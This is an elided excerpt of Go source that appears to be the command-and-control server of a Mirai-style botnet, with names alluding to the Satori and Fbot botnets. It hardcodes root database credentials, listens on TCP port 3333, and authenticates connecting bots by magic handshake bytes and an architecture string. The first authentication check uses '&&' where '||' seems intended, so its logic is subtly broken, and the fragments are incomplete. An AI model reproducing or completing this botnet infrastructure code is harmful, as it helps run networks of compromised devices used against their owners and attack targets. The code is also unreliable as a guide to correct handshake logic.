...
var db *database = new_db("127.0.0.1:3306", "root", "strongerthansatori", "net")
const initial_string string = "betterthanfbot"
...
func main() {
    ...
    c, err := net.Listen("tcp", "0.0.0.0:3333")
    if err != nil {
        fmt.Println(err)
        return
    }
...
func read_client_data(buf []byte, le int) (bool, string) {
    ...
    // Compare the packed bytes with their original values
    if a != 128 && b != 90 && c != 87 && d != 200 && e != 240 && f != 30 {
        return true, "unauthed"
    }

    // Store the arch string if any
    arch_len := binary.BigEndian.Uint16(buf[12:])
    str := buf[14:]
    arch := str[:arch_len]

    if arch_len == 0 {
        return false, string("unknown")
    }

    // Compare the packed bytes with their original values
    if a == 128 && b == 90 && c == 87 && d == 200 && e == 240 && f == 30 {
        return true, string(arch)
    }
